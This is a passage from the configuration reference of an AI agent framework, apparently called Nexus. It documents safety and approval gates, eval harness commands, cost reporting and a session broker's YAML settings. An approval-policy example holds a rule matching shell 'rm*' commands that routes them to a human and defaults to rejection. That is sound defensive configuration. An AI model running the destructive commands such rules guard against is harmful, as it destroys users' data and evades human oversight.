| `queue.max_pending`   | int     | `100`                                                       | Maximum buffered retry slots in `mode: queue`. Ignored in `reject` mode. |

### `nexus.gate.tool_timeout`

Source: `plugins/gates/tool_timeout/plugin.go`. Per-call deadline gate. On
`tool.invoke` it starts a timer; on expiry it emits a `tool.timeout`
observability event plus a synthetic `tool.result` carrying an error message
that names the exact override key. A `before:tool.result` veto suppresses any
late real result for the same call ID so the agent's `pendingToolCalls`
counter stays consistent. Note: Go cancellation is cooperative — the original
tool goroutine may keep running until it honors its own context. The gate's
job is to unblock the agent, not preempt the tool.

Per-tool override keys may be exact tool names (`web_fetch`) or
[`path.Match`](https://pkg.go.dev/path#Match)-style globs (`mcp.*`).
Resolution: an exact key wins; among glob matches the longest pattern wins;
otherwise `default_timeout` applies.

The synthetic error message format is fixed and intended to be read by
operators:

```
tool <name> exceeded timeout <duration>; raise via gates.tool_timeout.per_tool.<name>: <duration>
```

| Key               | Type            | Default | Description |
|-------------------|-----------------|---------|-------------|
| `default_timeout` | duration string | `30s`   | Applied when no `per_tool` key matches. |
| `per_tool`        | map[string]duration | `{}` | Per-tool overrides keyed by exact tool name or `path.Match` glob. |

### `nexus.gate.prompt_injection`

Source: `plugins/gates/prompt_injection/plugin.go`. Regex-only — no LLM.

| Key             | Type   | Default                                                       | Description |
|-----------------|--------|---------------------------------------------------------------|-------------|
| `action`        | string | `block`                                                       | `block` or `warn`. |
| `patterns`      | list   | *(default set)*                                               | Inline regex patterns added to defaults. |
| `patterns_file` | string | *(none)*                                                      | File of newline-separated regexes. |
| `message`       | string | `Input blocked: potential prompt injection detected.`         | Block message. |

### `nexus.gate.json_schema`

Source: `plugins/gates/json_schema/plugin.go`. Validates `before:io.output`
against a JSON Schema; on failure, asks the LLM to retry.

| Key             | Type            | Default     | Description |
|-----------------|-----------------|-------------|-------------|
| `schema`        | string \| object | *(required)* | JSON Schema as inline object or string. |
| `schema_file`   | string          | *(none)*    | Path to a schema file (takes precedence over `schema`). |
| `max_retries`   | int             | `3`         | Retry attempts. |
| `retry_prompt`  | string          | *(default)* | Retry instruction; supports `{schema}` and `{error}` templates. |

### `nexus.gate.output_length`

Source: `plugins/gates/output_length/plugin.go`. Asks the LLM to retry with a
shorter response; allows through after exhausted retries (with a warning).

| Key            | Type   | Default     | Description |
|----------------|--------|-------------|-------------|
| `max_chars`    | int    | `5000`      | Maximum response length. |
| `max_retries`  | int    | `2`         | Retry attempts. |
| `retry_prompt` | string | *(default)* | Retry prompt; supports `{length}` and `{limit}` templates. |

### `nexus.gate.content_safety`

Source: `plugins/gates/content_safety/plugin.go`. Built-in checks all default
to enabled.

| Key                          | Type | Default                                                       | Description |
|------------------------------|------|---------------------------------------------------------------|-------------|
| `action`                     | string | `block`                                                     | `block` or `redact`. |
| `message`                    | string | `Content blocked: contains sensitive information ({checks}).` | Block/redact message; `{checks}` lists triggered checks. |
| `scan_tool_results`          | bool | `false`                                                       | Also subscribe to `before:tool.result` and apply checks to tool output. Required to cover sub-agent / delegate output (which reaches the parent via `tool.result`, not `io.output`). Off by default because legitimate external tools (`web_fetch`, `knowledge_search`) often surface phone numbers / addresses that aren't leaks; enable for orchestrator-style topologies. |
| `check_pii_email`            | bool | `true`                                                        | Detect email addresses. |
| `check_pii_phone`            | bool | `true`                                                        | Detect phone numbers. |
| `check_pii_ssn`              | bool | `true`                                                        | Detect US SSNs. |
| `check_secrets_api_key`      | bool | `true`                                                        | Detect API-key-like strings. |
| `check_secrets_private_key`  | bool | `true`                                                        | Detect private-key blocks. |
| `check_secrets_password`     | bool | `true`                                                        | Detect password-shaped fields. |
| `check_credit_card`          | bool | `true`                                                        | Detect credit-card numbers. |
| `check_ip_internal`          | bool | `true`                                                        | Detect RFC1918 / internal IPs. |
| `custom_patterns`            | list | *(empty)*                                                     | Each `{name, pattern}`. |

### `nexus.gate.context_window`

Source: `plugins/gates/context_window/plugin.go`. Triggers compaction via
`memory.compact.request` when the estimated context approaches the limit.

| Key                  | Type  | Default  | Description |
|----------------------|-------|----------|-------------|
| `max_context_tokens` | int   | `100000` | Provider context window limit. |
| `trigger_ratio`      | float | `0.85`   | Trigger compaction at this fraction (0.0–1.0). |
| `chars_per_token`    | float | `4.0`    | Token estimation ratio. |

### `nexus.gate.tool_filter`

Source: `plugins/gates/tool_filter/plugin.go`. Modifies `request.ToolFilter` on
`before:llm.request`. `include` takes precedence over `exclude`.

| Key       | Type | Default     | Description |
|-----------|------|-------------|-------------|
| `include` | list | *(empty)*   | Allowlist of tool names. |
| `exclude` | list | *(empty)*   | Blocklist of tool names. |

### `nexus.gate.approval_policy`

Source: `plugins/gates/approval_policy/plugin.go`. Policy-driven approvals
on `before:tool.invoke` and `before:llm.request`. The gate evaluates a
config-supplied list of rules, and on first match emits a `hitl.requested`
event and blocks waiting on `hitl.responded`. The operator's choice
resolves to passthrough (allow), veto (reject), or passthrough-with-edits.

| Key     | Type | Default   | Description |
|---------|------|-----------|-------------|
| `rules` | list | *(empty)* | Ordered list of approval rules. First match wins. |

Each rule is a map with the following keys:

| Key              | Type   | Default   | Description |
|------------------|--------|-----------|-------------|
| `match`          | map    | *(empty)* | Field/value tests against the action payload. String values are glob (`*`, `?`); dotted keys address nested fields (e.g. `args.command`). |
| `mode`           | string | `choices` | One of `free_text`, `choices`, `both`. |
| `choices`        | list   | *(see)*   | List of `{id, label, kind}` (or bare-string id). When omitted in `choices` mode, defaults to `[{id: allow, kind: allow}, {id: reject, kind: reject}]`. |
| `default_choice` | string | *(empty)* | Choice id auto-selected when the timeout elapses. Without a default, a timeout vetoes the action. |
| `prompt`         | string | *(auto)*  | Go `text/template` string rendered against the action payload. Falls back to `Approve <kind>: <target>` when unset (or empty when `prompt_synthesizer` is set so the synthesizer can fill it in). |
| `prompt_synthesizer` | string | *(none)* | Capability ID of a registered prompt synthesizer (e.g. `hitl.prompt_synthesizer`). When set, the gate emits the request with `HITLRequest.PromptSynthesizer` populated and an empty `Prompt`, letting the synthesizer render an LLM-authored approval question via the canonical `before:hitl.requested` entry point. |
| `timeout`        | string | *(none)*  | Go duration (e.g. `5m`). When unset, the gate blocks indefinitely. |

Match keys recognized by the runtime payload:

- `action_kind` — `tool.invoke` or `llm.request`.
- `tool` — the tool name (only meaningful for `tool.invoke`).
- `args.<dotted>` — any nested key inside the tool's argument map.
- `model` — the LLM model id (only meaningful for `llm.request`).
- `role` — the LLM model role (only meaningful for `llm.request`).

Example:

```yaml
nexus.gate.approval_policy:
  rules:
    - match: { action_kind: tool.invoke, tool: shell, args.command: "rm*" }
      mode: choices
      choices: [allow, reject]
      timeout: 5m
      default_choice: reject
    - match: { action_kind: llm.request, model: "claude-opus-*" }
      mode: choices
      prompt: "About to call expensive model {{ .model }}. Approve?"
```

---

## Eval harness

The `eval:` block configures the offline eval harness invoked via the
`nexus eval` subcommand. The engine itself ignores this block — only
`cmd/nexus/eval.go` reads it. Per-flag overrides on the CLI take precedence
over config values, which take precedence over built-in defaults.

```yaml
eval:
  cases_dir: tests/eval/cases
  reports_dir: tests/eval/reports
  judge:
    model: claude-haiku-4-5
    temperature: 0
    n_samples: 1
    cache: true
  baseline:
    fail_on_score_drop: 0.05
    fail_on_latency_p95_drop: 0.20
```

| Key                                 | Type    | Default                  | Description |
|-------------------------------------|---------|--------------------------|-------------|
| `cases_dir`                         | string  | `tests/eval/cases`       | Directory containing case bundles (`<id>/case.yaml`, `input/`, `journal/`, `assertions.yaml`). Path expansion via `engine.ExpandPath`. |
| `reports_dir`                       | string  | `tests/eval/reports`     | Directory where `nexus eval run` writes per-run report directories (`<run-id>/report.json`, `<run-id>/summary.txt`, `<run-id>/_sessions/`). Path expansion via `engine.ExpandPath`. |
| `judge.model`                       | string  | `claude-haiku-4-5`       | Model used by the LLM judge for `--full` semantic assertions. **Declared in v1; consumed in Phase 5.** |
| `judge.temperature`                 | float   | `0`                      | Judge sampling temperature. **Declared in v1; consumed in Phase 5.** |
| `judge.n_samples`                   | int     | `1`                      | Number of judge samples per assertion; majority-threshold kicks in at `>=3`. **Declared in v1; consumed in Phase 5.** |
| `judge.cache`                       | bool    | `true`                   | Enable provider prompt cache for judge calls. **Declared in v1; consumed in Phase 5.** |
| `baseline.fail_on_score_drop`       | float   | `0`                      | Absolute pass-rate drop (0–1) that fails `nexus eval baseline`. `0` disables the gate. CLI flag: `--fail-on-score-drop`. |
| `baseline.fail_on_latency_p95_drop` | float   | `0`                      | Relative latency p95 increase (per case) that fails `nexus eval baseline`. `0` disables the gate. CLI flag: `--fail-on-latency-p95-drop`. |

### Subcommand overview

| Command | Description |
|--------|-------------|
| `nexus eval run [--case <id>] [--cases-dir <path>] [--tags <csv>] [--model <role>] [--deterministic] [--full] [--parallel <n>] [--report-dir <path>] [--config <path>]` | Run one or all cases under the cases dir; writes a JSON report. Exits 0 on all-pass, 1 if any case failed. |
| `nexus eval baseline --against <path> [--report <path>] [--fail-on-score-drop <f>] [--fail-on-latency-p95-drop <f>] [--out <path>] [--config <path>]` | Diff a fresh report against a stored baseline; honors thresholds for CI exit codes. `--against` path can be a `report.json` file or its containing run-id directory; does not descend a parent that contains multiple runs. |
| `nexus eval promote --session <id-or-path> --case <new-id> [--cases-dir <path>] [--owner <name>] [--tags <csv>] [--description <text>] [--no-edit] [--force] [--config <path>]` | Convert a real session under `~/.nexus/sessions/` into a deterministic eval case. See [`docs/src/eval/promotion.md`](../eval/promotion.md). |
| `nexus eval record --from-session <id-or-path> --case <new-id> [...]` | Alias of `eval promote` — same flag set, same behaviour. |
| `nexus eval --inspect-mode [--timeout=DURATION]` | Single-shot JSON-on-stdin/stdout protocol for external harnesses (Inspect AI, Braintrust, custom CI). Reads one request from stdin, writes one response to stdout. Mutually exclusive with subcommands. Deadline via `--timeout` flag, `NEXUS_EVAL_INSPECT_TIMEOUT` env, or 60s default. Wire format documented at [`docs/src/eval/inspect-protocol.md`](../eval/inspect-protocol.md). |

### Environment variables

| Variable | Default | Description |
|----------|---------|-------------|
| `NEXUS_EVAL_INSPECT_TIMEOUT` | `60s` | Per-request deadline for `nexus eval --inspect-mode`. Parsed as `time.Duration` (e.g. `30s`, `5m`). The `--timeout` flag overrides this; an empty value falls back to the default. Source: `cmd/nexus/eval.go:514-537`. |
| `NEXUS_EVAL_INSPECT_KEEP_SESSIONS` | *(unset)* | When set to any non-empty value, retains the per-call temporary sessions root (`os.MkdirTemp` directory) for debugging instead of deleting it on exit. Off by default — directory is removed after the response is written. Source: `pkg/eval/protocol/runner.go:53-60`. |

---

## Cost CLI

`nexus cost report` aggregates cost-attribution data from session
journals (idea 09). Costs come from `llm.response.cost_usd` which
providers emit using `pkg/engine/pricing` — the CLI is provider-agnostic.

| Command | Purpose |
|---------|---------|
| `nexus cost report [--session <id>] [--tenant <t>] [--group-by <dim>] [--since <duration>] [--json] [--config <path>]` | Aggregate `llm.response` records by tag dimension. |

Flags:

- `--session <id>` — limit to one session id. Default: every session under `sessions.root`.
- `--tenant <t>` — only `Tags["tenant"] == t`.
- `--group-by <dim>` — one of `session_id` (default), `tenant`, `project`, `user`, `source_plugin`, `model`, `task_kind`.
- `--since <duration>` — only events newer than `now - <duration>` (e.g. `24h`, `7d`).
- `--json` — emit JSON instead of the default table.

Tags are populated by:

- The engine's `before:llm.request` seeder (`session_id`, plus `tenant`/`project`/`user` from `SessionMeta.Labels`).
- Each `llm.request`-emitting plugin (`source_plugin`, plus `task_kind` on `req.Metadata`).
- Plugins routing decisions (`_routed_by`, `_routed_rule`, `_downgraded_by`, `_downgraded_from` on `req.Metadata`).

---

## Session broker (`nexus-broker`)

The `nexus-broker` binary (`cmd/nexus-broker`) is a **standalone service**, not
an engine plugin. It reads its own YAML config file (default path
`broker.yaml`, override with `-config <path>`) and fronts OS-isolated Nexus
instances behind an HTTP/WebSocket gateway.

```yaml
# broker.yaml
listen_addr: ":8080"
advertise_addr: ""            # required behind a proxy/LB; see below

# The named registry of nexus variants this broker may spawn. The `nexus` entry
# always exists — declare it to override its path, omit it to take the default.
binaries:
  nexus:
    path: "nexus"
  vision:
    path: "/opt/nexus/bin/nexus-vision"
    label: "Nexus (vision)"
    description: "Multimodal build with the image tools compiled in"
    args: ["-profile", "vision"]
    env:
      NEXUS_VISION: "1"

max_concurrent: 8
client_replay_buffer_bytes: 1048576   # per-lease client-bound replay retention (1 MiB)
idle_timeout: 5m
max_turn_duration: 30m        # bound on an in-flight turn; <=0 disables the bound
queue_wait_timeout: 30s
release_grace: 10s
state_dir: ""                 # empty = lease state is in-memory only; see below
broker_id: ""                 # empty = generated once and persisted in state_dir
reattach_window: 60s          # how long a lease restored after a restart waits for its instance

# Optional. The A2A front door: one public agent per profile. Omit the whole
# block and the broker has no A2A ingress, exactly as before.
agents:
  support:
    binary: nexus               # optional; omitted means the reserved `nexus` entry
    config: "~/agents/support.yaml"
    card:
      name: "Support Agent"
      description: "Answers customer questions from the product knowledge base."
      version: "1.2.0"
      skills:
        - id: "answer"
          name: "Answer questions"
          description: "Answers a customer question and cites its sources."

# Optional. Settings every `agents:` profile shares. Omit it and the defaults
# below apply.
a2a:
  tasks:
    ttl: 24h                  # how long a finished task stays readable
    max_per_context: 50       # how many tasks are kept per caller+conversation
    input_timeout: 15m        # how long a task may wait at INPUT_REQUIRED

# Optional. Omit the whole block to run the broker unauthenticated.
auth:
  admin_scope: "nexus.broker.admin"   # scope that unlocks the operator view of GET /leases
  validators:
    - type: static
      tokens:
        - token: "replace-me"
          principal: "ci-runner"
          tenant: "acme"
          scopes: "broker.claim broker.release"   # whitespace-separated, or a YAML list
```

| Key                  | Type     | Default  | Description                                                                 |
|----------------------|----------|----------|-----------------------------------------------------------------------------|
| `listen_addr`        | string   | `:8080`  | host:port the broker's HTTP/WS gateway binds to. `GET /healthz` returns `{"status":"ok"}`. |
| `advertise_addr`     | string   | *(empty)* | The address **clients** use to reach **this** broker, and the highest-precedence input to the `ws_url` returned by `POST /claim`. Accepts a bare `host:port` (implying `ws://`) or a scheme-qualified `ws://`, `wss://`, `http://` or `https://` host — the port is optional in that form, and `http`/`https` are normalized to `ws`/`wss`. **Required whenever the broker sits behind a reverse proxy or load balancer**, or whenever `listen_addr` uses a wildcard/empty host (`:8080`, `0.0.0.0:8080`, `[::]:8080`): without it the `ws_url` is derived from the claim request's `Host` header, which then names the proxy rather than the broker holding the lease. Validated at boot — a value with no port, a wildcard host (`0.0.0.0`, `::`), an unsupported scheme, or any path/query/fragment/userinfo **fails startup**. Leave it empty for a directly-reachable broker; the `ws_url` then resolves exactly as it did before this key existed. See [`ws_url` resolution](#ws_url-resolution) below. |
| `binaries`           | map      | *(synthesized)* | The registry of named `nexus` variants this broker may spawn, keyed by the name a claim selects. Entry fields are listed under [Binary registry](#binary-registry-binaries) below. After a successful load the registry **always** contains a `nexus` entry — the name is reserved and an operator's block can add to the registry but cannot remove it. Omit the key entirely and the registry is synthesized as a single `nexus` entry with path `nexus`, which is exactly the pre-registry behaviour. Validated at boot: an entry with an empty name, an empty/missing `path`, or a name that collides with another after trimming **fails startup**, and so does **any entry whose `path` does not resolve to an executable file** — see [Binary resolution](#binary-resolution) below. |
| `inherit_env`        | list of string | *(empty)* | The variables a spawned instance inherits from the **broker's own environment**, by **name** only. A spawn carries the always-pass set (`HOME`, `LANG`, `PATH`, `TZ`), everything named here that the broker process actually holds, its entry's [`env`](#binary-registry-binaries), and the three broker-owned `NEXUS_BROKER_*` variables — **and nothing else**. Empty (the default) means an instance carries no provider credential from the broker's shell, which is a **deliberate break** with the earlier behaviour of passing `os.Environ()` through wholesale; see [Instance environment](#instance-environment-inherit_env) below and the guide's migration note. Entries are trimmed, de-duplicated and sorted at load. An empty entry, a `NAME=value` pair (this key forwards a variable, it does not set one — use `binaries.<name>.env` for that) or a `NEXUS_BROKER_*` name (injected by the broker on every spawn, so declaring it does nothing) is a **boot failure** naming the key. A declared name the broker does not hold is **not** an error: it is skipped, omitted from the per-entry boot log line, and named once in a startup `WARN`. |
| `run_as`             | map      | *(absent)* | The **default OS credential** spawned instances run under — `uid` and `gid`, both required whenever the block is written — for every `binaries:` entry that does not declare its own. Absent (the default) means instances run as the broker's own uid and gid, exactly as they always have, and the spawn is byte-identical to what it was before this key existed. An entry's [`run_as`](#binary-registry-binaries) **replaces** this outright rather than merging field by field. Validated at boot: a block with only one of the two fields, a negative id, or an id above 4294967295 **fails startup** naming the key (and, for an entry, the entry). Requires the broker to run as **root** or hold `CAP_SETUID` **and** `CAP_SETGID`; otherwise every claim selecting such an entry fails to spawn. See [Running instances as another user](#running-instances-as-another-user-run_as) below. |
| `nexus_binary_path`  | string   | `nexus`  | **Deprecated — use `binaries.nexus.path`.** Path to the `nexus` binary the broker exec()s to spawn instances. Funneled through `ExpandPath` (supports `~`). Still honoured so existing deployments boot unchanged: when it is set and `binaries.nexus` is **absent**, its value is folded into the reserved `nexus` entry and the broker logs one `WARN` naming the replacement key. Setting it **and** `binaries.nexus` is a **boot failure** naming both keys — see [Binary registry](#binary-registry-binaries). Setting it to the empty string is also a boot failure (remove the key to take the default). |
| `max_concurrent`     | int      | `8`      | Maximum number of live instances (one per lease). Each `POST /claim` acquires a capacity slot **before** spawning, and the slot is freed on every teardown path (manual `POST /release`, idle, crash, and any failed/aborted claim), so the live count can never exceed this cap or drift. A claim that arrives at capacity does **not** fail outright: it parks in a FIFO wait queue bounded by `queue_wait_timeout` (see below). Set `max_concurrent` to `0` (or any non-positive value) to mean **unlimited** (no cap). |
| `client_replay_buffer_bytes` | int | `1048576` (1 MiB) | How many bytes of **already-sent, client-bound frames** each lease retains so a client that missed them can be replayed. The broker stamps a **monotonic, per-lease sequence** (`seq`, counting from 1) on every frame it sends a lease's client, and keeps the encoded bytes here, evicting **oldest first** once the bound is reached. Both of the gateway's loss paths — no client attached, and an attached client whose send queue is full — retain the frame rather than discarding it, so the gap is both **detectable** (the sequence jumps) and **recoverable** (the frames are still held). Only client-bound frames are sequenced and buffered: instance-bound frames carry no `seq` and are not retained, so nothing on the dial-back side changed. The bound is in **bytes, not frames**, because client-bound payloads run from a few-byte token delta to a hundred-kilobyte tool result — a frame count would say nothing about memory. **Worst-case memory across the broker is this value × [`max_concurrent`](#session-broker-nexus-broker)** — 8 MiB at both defaults; with `max_concurrent: 0` (unlimited) it is unbounded, so pair the two. A single frame larger than the whole bound is not retained at all (it is evicted immediately) rather than breaching the bound. Set it to `0` to **disable retention** while leaving sequencing intact: loss stays visible to the client, but the broker keeps nothing to replay. A **negative** value is a boot failure naming the key. Clients reach the retained frames with [`?from_seq=`](#ws-leaselease_id-http-api-not-yaml) on the client socket, which replays the retained tail before the live stream and announces an explicit `stream-gap` frame when the bound can no longer cover the requested resume point. The buffer is **in-memory and dies with the lease**: it is never journaled, `state_dir` does not persist it, and a broker restart starts every lease's sequence again at 1 with an empty buffer. |
| `idle_timeout`       | duration | `5m`     | How long a lease with **no turn in flight** may sit with no client activity before the broker releases it, with the terminal reason `idle`. "Activity" is an inbound `io` frame flowing client → instance (user input) **or** the moment the instance reports its turn finished; instance → client output mid-turn, pings, and control frames do **not** reset the timer. A lease whose instance is **working** is exempt regardless of how long ago the client last typed — the broker reads the `io.status` state off the instance's own frames, treats `thinking`, `tool_running`, `streaming`, `waiting` and `cancelling` as a live turn and `idle` as its end, and bounds the exemption with [`max_turn_duration`](#session-broker-nexus-broker). So this key is sized to the longest **human pause** a session should survive, not to the longest **turn** an agent might take. The release reuses the `POST /release` teardown path (shutdown frame → `release_grace` → force-kill → reap), so the session is persisted and the client WS closes with the going-away status. A background sweeper polls at `min(idle_timeout/4, 15s)` (floored at `50ms`). Set `idle_timeout` to `0` (or any non-positive value) to **disable** reaping entirely — which also switches off `max_turn_duration`, since the same sweeper enforces both. |
| `max_turn_duration`  | duration | `30m`    | How long a **single in-flight turn** may exempt its lease from `idle_timeout` before the broker releases it anyway, with the distinct terminal reason `turn timeout` (not `idle`, so an operator reading the journal can tell "nobody was here" from "killed mid-work"). It is the backstop on the live-turn exemption: an instance that wedges, or whose tool never returns, never reports the `idle` state that settles a turn and would otherwise hold its lease — and its `max_concurrent` slot — for the lifetime of the broker. The clock starts at the **first** work state after a settled period and is *not* refreshed by later status frames, so it measures the whole turn rather than the gap between frames. Teardown is the ordinary shared path, identical to an idle release apart from the recorded reason. Set it to `0` (or any non-positive value) to **disable the bound**, restoring an unbounded exemption — a live turn then holds its lease indefinitely. It is enforced by the idle sweeper, so it is inert when `idle_timeout <= 0`. Size it above the longest turn this deployment legitimately runs: a lease reaped as `turn timeout` had work in progress. |
| `queue_wait_timeout` | duration | `30s`    | How long an over-capacity `POST /claim` parks in the **FIFO capacity wait queue** before giving up. When `max_concurrent` is full, a claim waits in arrival order; the moment a slot frees (via `POST /release`, idle, or crash teardown) it is handed **directly** to the oldest waiter, which then spawns — no fresh claim can barge ahead of a longer-queued one, and the waiters reuse the same single slot counter (no second accounting path). A waiter that exceeds `queue_wait_timeout` returns **HTTP 503** `{"error":"capacity wait timed out"}` (distinct message from the immediate `{"error":"no capacity"}`). If the client disconnects while queued, the waiter is dropped from the queue and holds no slot. Set `queue_wait_timeout` to `0` (or any non-positive value) to **disable waiting**: an at-capacity claim is then rejected immediately with **HTTP 503** `{"error":"no capacity"}` (no instance spawned). |
| `release_grace`      | duration | `10s`    | How long a release (manual `POST /release`, and later idle/crash teardown) waits for an instance to shut its engine down cleanly before the broker force-kills it. The graceful path always persists the session; the kill is the orphan-prevention backstop. |
| `state_dir`          | string   | *(empty)* | Per-broker directory holding this broker's **lease journal** (`leases.jsonl`), its **session → binary index** (`session-binaries.jsonl`), its **A2A context → session index** (`a2a-contexts.jsonl`) and **A2A task store** (`a2a-tasks.jsonl`, both written only when `agents:` is configured), its **spawn-secret derivation key** (`spawn-key`, mode `0600`) and, when `broker_id` is unset, its generated identity (`broker-id`). Funneled through `ExpandPath` (supports `~`). **Empty (the default) disables lease persistence entirely**: nothing is written, no directory is created, spawn secrets stay random per spawn, restart recovery does not run, neither the session → binary index nor the A2A context index exists (an A2A conversation is then resumable only for as long as this process lives), the A2A task store is memory-only (`GetTask`/`ListTasks`/`SubscribeToTask` still answer, but only for tasks this process ran — see [A2A task retention](#a2a-task-retention-a2atasks)), and the broker behaves exactly as it did before this key existed — it logs one `WARN` at startup saying lease state is in-memory only. **Must not be shared between brokers**: two brokers pointed at one directory would append to the same journal and compact each other's live leases away. Created on demand (mode `0700`); a `state_dir` that is set but unusable **fails startup**. See [Lease durability](#lease-durability-state_dir), [A2A context → session index](#a2a-context--session-index-a2a-contextsjsonl) and [Restart recovery](#restart-recovery-reattach_window) below. |
| `broker_id`          | string   | *(empty)* | The identity stamped on every persisted lease record, alongside `advertise_addr`, so a future shared store can tell whose lease is whose. Must be **stable across restarts** of the same broker. Empty (the default) means the broker generates one on first boot and persists it at `<state_dir>/broker-id`, reusing it thereafter — stable and unique with no operator effort. Set it explicitly to give a broker a name that means something in a cluster (`broker-eu-1`). Irrelevant while `state_dir` is unset, since nothing is then recorded. |
| `reattach_window`    | duration | `60s`    | How long a lease **restored from the journal after a restart** may wait for its instance to reconnect before the broker reaps it (kills the process, frees the slot, closes the record out through the shared `POST /release` teardown). Only restored leases are subject to it; an ordinary claimed lease is never touched. A restored lease that reattaches inside the window becomes a fully ordinary lease — idle sweeping, crash watching, ownership checks and `POST /release` all apply to it unchanged. A non-positive value **falls back to the 60s default rather than disabling the reaper**: "wait forever" would leave a capacity slot held by an instance that is never coming back, which is the orphan restart recovery exists to remove. Irrelevant while `state_dir` is unset, since nothing is then restored. See [Restart recovery](#restart-recovery-reattach_window) below. |
| `auth`               | map      | *(absent)* | Client authentication for the control-plane routes. It does **not** govern the instance dial-back on `WS /instance`, which always requires the per-spawn secret. **Absent means authentication is disabled** and every route behaves exactly as it did before the key existed; the broker logs one `WARN` at startup saying so. A **malformed** block is a boot failure naming the offending key — it never falls back to disabled. See [Authentication](#authentication-auth) below. |
| `a2a`                | map      | *(absent)* | Settings shared by every [`agents:`](#agent-profiles-agents) profile. Today it holds one sub-block, `a2a.tasks`, which bounds the durable A2A **task store**. It is separate from `agents:` because nothing in it is per profile: the store is one file, with one retention policy, for the whole broker. Absent means every default below applies. See [A2A task retention](#a2a-task-retention-a2atasks). |
| `a2a.tasks.ttl`      | duration | `24h`      | How long a **terminal** task stays readable after its last transition. `"0s"` keeps every task until a cap evicts it. Must be a duration **string** (`"24h"`, `"90m"`) — a bare number fails the boot rather than being read as nanoseconds. A negative value is a boot failure naming the key. See [A2A task retention](#a2a-task-retention-a2atasks). |
| `a2a.tasks.max_per_context` | int | `50`   | How many tasks are kept per (**caller**, `contextId`) pair. `0` disables the cap. The cap is per caller as well as per context so one principal's traffic cannot evict another's — an eviction channel is still a channel. Only **terminal** tasks are evictable; a live task counts against the cap but is never dropped. A negative value is a boot failure. See [A2A task retention](#a2a-task-retention-a2atasks). |
| `a2a.tasks.input_timeout` | duration | `15m` | How long a task may sit at `TASK_STATE_INPUT_REQUIRED` before the broker abandons it: the task is driven to `TASK_STATE_FAILED` and the instance is told to cancel the turn. `"0s"` disables the deadline. This is also the **queue deadlock policy** — a parked task holds its conversation's serial queue and its leased instance, so without a deadline one unanswered question would strand every message behind it. Must be a duration string; a negative value is a boot failure. See [Serial task queueing](#serial-task-queueing). |
| `agents`             | map      | *(absent)* | The named **A2A agent profiles** this broker publishes, keyed by the name their routes are namespaced under. Each profile binds a Nexus config, a `binaries:` entry and an Agent Card, so a third-party A2A client can address an agent by URL instead of supplying the full nexus config `POST /claim` demands. Entry fields are listed under [Agent profiles](#agent-profiles-agents) below. **Absent (the default) means this broker has no A2A ingress at all** — no routes are registered and nothing new appears in the boot log, so a `broker.yaml` written before profiles existed behaves exactly as it did. Validated at boot: an empty or non-URL-safe profile name, a name that collides with another after trimming, a missing `config`, a `binary` that is not in the registry, a card missing a required field, or a config file that does not resolve to a readable file **fails startup**.

### Binary registry (`binaries`)

One broker can front several `nexus` builds — a base binary, a vision-enabled
build, a pinned older release — instead of the single spawn target
`nexus_binary_path` allowed. Each entry is keyed by the **name a claim selects
it by**; the key is the name, so an entry cannot disagree with itself.

```yaml
binaries:
  nexus:                                    # reserved; declare it only to override the path
    path: "/usr/local/bin/nexus"
  vision:
    path: "~/builds/nexus-vision"           # ExpandPath applies here too
    label: "Nexus (vision)"
    description: "Multimodal build with the image tools compiled in"
    args: ["-profile", "vision"]
    env:
      NEXUS_VISION: "1"
```

| Entry field   | Type              | Default    | Description                                                                 |
|---------------|-------------------|------------|-----------------------------------------------------------------------------|
| `path`        | string            | *(required)* | The executable the broker exec()s for this entry. Funneled through `ExpandPath` (supports `~`). A value with **no path separator** (`nexus`, `nexus-vision`) is looked up on the broker process's `PATH`; anything else is used as a location on disk, relative to the broker's working directory if it is not absolute. **Required** — an empty or missing `path` fails startup naming the entry. It is deliberately not defaulted to the entry name, which would turn a typo into a silent `PATH` lookup for a binary the operator never meant to run. Resolved and verified at boot — see [Binary resolution](#binary-resolution). |
| `label`       | string            | *(empty)*  | Short human-readable name for operator/client surfaces (`"Nexus (vision)"`). Purely presentational; nothing routes on it. Consumers fall back to the entry name when empty. |
| `description` | string            | *(empty)*  | One-line explanation of what this variant is for, for the same surfaces as `label`. Purely presentational. |
| `args`        | list of string    | *(empty)*  | Extra argv entries for this variant, appended **after** the broker's own spawn arguments so they can add to the command line but never displace the `-config` / `-recall` contract the instance protocol depends on. |
| `env`         | map string→string | *(empty)*  | Extra environment variables for this variant, layered **over** what the spawn inherited from the broker (the always-pass set and [`inherit_env`](#instance-environment-inherit_env)) and **under** the broker-owned `NEXUS_BROKER_*` variables. Those name the dial-back address, the lease and the spawn secret; the broker's values always win, so an entry cannot point an instance at another broker, hand it the wrong lease, or supply its own spawn secret. This is where a value that is a property of the **variant** belongs; `inherit_env` is where a value that lives in the **broker's own environment** belongs. |
| `run_as`      | map               | *(absent)* | The OS credential **this entry's** instances are exec()d under: `uid` and `gid`, both required whenever the block is written. Overrides the broker-level [`run_as`](#session-broker-nexus-broker) outright — an entry that declares it does not merge with the default. Absent and with no broker-level default, instances run as the broker's own user, which is what every spawn did before this key existed. When it is set, **`HOME` follows the credential**: the spawn's `HOME` is the `run_as` user's home directory from the passwd database, unless this entry's `env` sets `HOME` itself. A uid whose home cannot be resolved and whose entry does not set `env.HOME` **fails startup** naming the entry. Supplementary groups are **dropped** (`setgroups(0, NULL)`), so the instance holds only the declared gid. See [Running instances as another user](#running-instances-as-another-user-run_as). |

**Selecting an entry.** A claim picks one with the optional `binary` field of
its request body — see [`POST /claim`](#post-claim-http-api-not-yaml). An unknown
name is rejected with **HTTP 400** before the claim allocates anything.

**Discovering the entries.** Clients read the live registry from
[`GET /binaries`](#get-binaries-http-api-not-yaml), which returns `name`, `label`
and `description` per entry — never `path`, `args` or `env`.

**The `nexus` name is reserved.** After a successful load the registry always
contains it, so the base binary is spawnable from every broker no matter what
the config says. There is deliberately **no `default: true` field**: a claim
that names no binary always means `nexus`, so an operator cannot silently
change what an existing client ends up spawning.

**Folding the deprecated `nexus_binary_path`.** The two keys are resolved at
boot, from the same file, in exactly four cases:

| `nexus_binary_path` | `binaries.nexus` | Result |
|---|---|---|
| absent  | absent  | `nexus` synthesized with path `nexus` — the historical zero-config default, unchanged. |
| set     | absent  | The value becomes the `nexus` entry's `path`, and one `WARN` names `binaries.nexus.path` as the replacement. Every pre-registry deployment boots unchanged. |
| absent  | set     | Taken as written; nothing to fold. |
| set     | set     | **Boot failure** naming both keys. Picking a winner would mean half the operators hitting it silently spawn the binary they did not mean, and the mistake would only surface as instances behaving oddly. |

### Instance environment (`inherit_env`)

A claimed instance is handed a config **the caller wrote**, and every Nexus
provider resolves its credential from an environment variable that config
